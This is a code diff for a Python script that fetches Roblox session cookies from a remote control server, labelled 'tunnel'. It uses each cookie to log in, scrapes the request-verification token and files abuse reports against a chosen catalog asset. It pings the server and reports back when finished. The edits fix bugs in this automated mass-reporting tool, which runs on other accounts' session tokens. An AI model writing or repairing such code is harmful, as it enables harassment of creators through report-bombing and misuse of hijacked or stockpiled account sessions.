@@ -20,7 +20,7 @@ def log(message):
     })
 
 def start_report(cookie):
-    url = f'https://www.roblox.com/abusereport/asset?id={id}&redirecturl=%2fcatalog%2f{id}%2funnamed'
+    url = f'https://www.roblox.com/abusereport/asset?id={asset_id}&redirecturl=%2fcatalog%2f{id}%2funnamed'
     session = requests.Session()
     session.cookies.update({'.ROBLOSECURITY': cookie})
     request_verification_token = re.search('<input name="__RequestVerificationToken" type="hidden" value="(.+)"', session.get(url).text).group(1)
@@ -51,7 +51,7 @@ def start_report(cookie):
 def pinger():
     while True:
         requests.post(tunnel + "/ping", {
-            id : action_id
+            "id" : action_id
         })
         time.sleep(3)
 
@@ -60,11 +60,11 @@ log("connected")
 
 
 cookies = requests.post(tunnel + "/get_cookie", {
-    id: action_id
+    "id": action_id
 }).json()
 for cookie in cookies:
     start_report(cookie)
 
 requests.post(tunnel + "/done", {
-    id : action_id
+    "id" : action_id
 })
